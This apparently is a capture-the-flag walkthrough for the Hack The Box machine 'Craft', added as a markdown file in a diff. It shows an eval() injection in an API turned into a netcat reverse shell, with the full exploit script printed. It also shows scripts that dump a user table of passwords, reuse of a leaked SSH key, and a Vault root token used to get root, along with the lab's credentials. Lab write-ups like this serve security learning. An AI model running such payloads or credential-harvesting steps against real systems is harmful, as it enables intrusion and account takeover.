@@ -1,0 +1,284 @@
+### FootHold Shell:
+
+First using nmap, found you there's port 443 opened.(HTTPS)
+So now we comming to 10.10.10.110:443, setting broswer allow to view page.
+
+Then we can find out there's a icon button redirect to https://gogs.craft.htb .
+After clicking in, it seems that gogs.craft.htb is a internal sub-domain.
+
+So, we modified the /etc/hosts file like this:
+cat /etc/hosts
+127.0.0.1	localhost
+127.0.1.1	kali
+10.10.10.110 gogs.craft.htb
+#10.10.10.110 api.craft.htb #this one will be modified later.
+
+Next, click the icon and go to gogs.craft.htb !
+
+You can found a cred in Explore -> dinesh -> Public Activity -> a2d28ed155 Cleanup test 
+url : https://gogs.craft.htb/Craft/craft-api/commit/a2d28ed1554adddfcfb845879bfea09f976ab7c1
+> dinesh:4aUh0A8PbVJxgd
+
+login to gogs to check if the cred works.
+We can find a test.py code here : https://gogs.craft.htb/Craft/craft-api/src/master/tests/test.py
+It shows that we can add a `brew` by this code.
+Remember adding the creds at >>> auth=('dinesh', '4aUh0A8PbVJxgd') 
+Add there's another sub-domain : api.craft.htb
+so modified the /etc/hosts file again:
+127.0.0.1	localhost
+127.0.1.1	kali
+10.10.10.110 gogs.craft.htb
+10.10.10.110 api.craft.htb
+
+
+Run and Test the script :)
+
+
+
+Next, find an issue they (devs) r talking about.
+They fix some code and paste it on git :)
+url : https://gogs.craft.htb/Craft/craft-api/commit/c414b160578943acfe2e158e89409623f41da4c6
+
+>>>>>>>> vulns code can be injected: >>>>>>>>>>>>>>>>>>>>>>>>>
+if eval('%s > 1' % request.json['abv']):
+	return "ABV must be a decimal value less than 1.0", 400
+>>>>>>>> vulns code end      >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+After some googling , found out that eval() can give us a reverse shell.
+%s can be controlled, the injection syntax is :
+> __import__("os").system("nc 10.10.14.48 7777 -e /bin/sh")
+Remember the test.py code ?
+Using that to inject parameters 'abv'.
+
+The Whole script is :
+
+============================ /root/Desktop/htb/craft/gogs.craft/dinesh/craft-api/tests/test.py ===================
+import requests
+import json
+import urllib3
+urllib3.disable_warnings()
+
+response = requests.get('https://api.craft.htb/api/auth/login',  auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False)
+json_response = json.loads(response.text)
+token =  json_response['token']
+
+headers = { 'X-Craft-API-Token': token, 'Content-Type': 'application/json'  }
+
+# make sure token is valid
+response = requests.get('https://api.craft.htb/api/auth/check', headers=headers, verify=False)
+print(response.text)
+
+# create a sample brew with real ABV... should succeed.
+print("Create real ABV brew")
+brew_dict = {}
+brew_dict['abv'] = '__import__("os").system("nc 10.10.14.48 7777 -e /bin/sh")'
+brew_dict['name'] = 'testbullshit'
+brew_dict['brewer'] = 'bullshit'
+brew_dict['style'] = 'bullshit'
+
+json_data = json.dumps(brew_dict)
+response = requests.post('https://api.craft.htb/api/brew/', headers=headers, data=json_data, verify=False)
+print(response.text)
+
+============================== /root/Desktop/htb/craft/gogs.craft/dinesh/craft-api/tests/test.py ================
+
+
+
+After executeing this script, now we have the foothold on box, but in a dockercontainer :(
+How did I know that? Cause There's a flie named .dockerenv at / .
+Then take a look at this article:
+https://tuhrig.de/how-to-know-you-are-inside-a-docker-container/
+
+We check it by command :
+/opt/app # cat /proc/self/cgroup
+10:memory:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c
+9:blkio:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c
+8:freezer:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c
+7:perf_event:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c
+6:cpu,cpuacct:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c
+5:net_cls,net_prio:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c
+4:pids:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c
+3:cpuset:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c
+2:devices:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c
+1:name=systemd:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c
+
+self is the only one docker container has. So.... :)
+
+=====================================================================================================================
+
+
+### USER Shell:
+
+Ok now we here, can execute more script on server ( cause some craft.settings is on server )
+
+We can upload a modified dbtest.py, to check out the database , maybe get a user name list or password if we r lucky :)
+
+First modified the fetchone() to fetchall(), so the results can be output more than one.
+> result = cursor.fetchone() changed to
+> result = cursor.fetchall()
+
+
+Second, change the sql query to "show tables" to check out if there's another table 
+(I also checked if there's another database ornot too, turn out nope.)
+
+
+
+the script :
+=================/root/Desktop/htb/craft/bug.py=================================
+#!/usr/bin/env python
+
+import pymysql
+from craft_api import settings
+
+# test connection to mysql database
+
+connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,
+                                 user=settings.MYSQL_DATABASE_USER,
+                                 password=settings.MYSQL_DATABASE_PASSWORD,
+                                 db=settings.MYSQL_DATABASE_DB,
+                                 cursorclass=pymysql.cursors.DictCursor)
+
+try: 
+    with connection.cursor() as cursor:
+        sql = "SHOW TABLES"
+        cursor.execute(sql)
+        result = cursor.fetchall()
+        print(result)
+
+finally:
+        connection.close()
+=====================/root/Desktop/htb/craft/bug.py==============================
+
+
+
+run script results:
+/opt/app # python bug.py
+[{'Tables_in_craft': 'brew'}, {'Tables_in_craft': 'user'}]
+
+BINGO ! user table.
+
+Then change the sql query in script to "SELECT * FROM `user`"
+
+The script :
+===================/root/Desktop/htb/craft/bug_test2.py=========================
+#!/usr/bin/env python
+
+import pymysql
+from craft_api import settings
+
+# test connection to mysql database
+
+connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,
+                                 user=settings.MYSQL_DATABASE_USER,
+                                 password=settings.MYSQL_DATABASE_PASSWORD,
+                                 db=settings.MYSQL_DATABASE_DB,
+                                 cursorclass=pymysql.cursors.DictCursor)
+
+try: 
+    with connection.cursor() as cursor:
+        sql = "SELECT * FROM `user`"
+        cursor.execute(sql)
+        result = cursor.fetchall()
+        print(result)
+
+finally:
+        connection.close()
+==================/root/Desktop/htb/craft/bug_test2.ph=========================
+
+run script resluts:
+/opt/app # python bug_test2.py
+[{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}, {'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}, {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]
+
+
+Now we test those creds on gogs. the 
+{'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]
+worked.
+
+After logging in, found out this guy hide his ssh key here:
+https://gogs.craft.htb/gilfoyle/craft-infra/src/master/.ssh
+
+I suggest you download the whole craft-infra Repositories.(because I have a login failure by just copying the id_sha file)
+Last, downloading the whole files.
+
+> chmod 600 id_rsa
+> ssh -i id_rsa gilfoyle@10.10.10.110
+> enter password: ZEU3N8WNM2rh4T
+
+Done :D !
+
+
+gilfoyle@craft:~$
+
+=========================================================================================================================
+
+### ROOT SHELL :
+
+Login as ssh : ssh -i id_rsa gilfoyle@10.10.10.110
+
+Then found that there's a .vault-token under /home/gilfoyle dir.
+now we try using the token to login vault
+
+gilfoyle@craft:~$ cat .vault-token
+a38896a2-1d4c-c467-5e8c-6ad2fd1d7703
+
+gilfoyle@craft:~$ vault login token=a38896a2-1d4c-c467-5e8c-6ad2fd1d7703
+Success! You are now authenticated. The token information displayed below
+is already stored in the token helper. You do NOT need to run "vault login"
+again. Future Vault requests will automatically use this token.
+
+Key                  Value
+---                  -----
+token                a38896a2-1d4c-c467-5e8c-6ad2fd1d7703
+token_accessor       9d980915-15e3-1bb1-f70a-deff5ef754ee
+token_duration       ∞
+token_renewable      false
+token_policies       ["root"]
+identity_policies    []
+policies             ["root"]
+
+found out that the token is a root token
+
+Then, we using the vault one time password to login to ourself as root.
+
+vault ssh root@10.10.10.110
+
+OTP for the session is: 88059f10-ea4f-a77c-b39c-308050725ddb
+
+
+  .   *   ..  . *  *
+*  * @()Ooc()*   o  .
+    (Q@*0CG*O()  ___
+   |\_________/|/ _ \
+   |  |  |  |  | / | |
+   |  |  |  |  | | | |
+   |  |  |  |  | | | |
+   |  |  |  |  | | | |
+   |  |  |  |  | | | |
+   |  |  |  |  | \_| |
+   |  |  |  |  |\___/
+   |\_|__|__|_/|
+    \_________/
+
+
+
+Password: 88059f10-ea4f-a77c-b39c-308050725ddb
+Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Fri Nov  1 09:53:25 2019 from 10.10.10.110
+root@craft:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@craft:~#
+
+
+============================
+
+
+
+DONE !
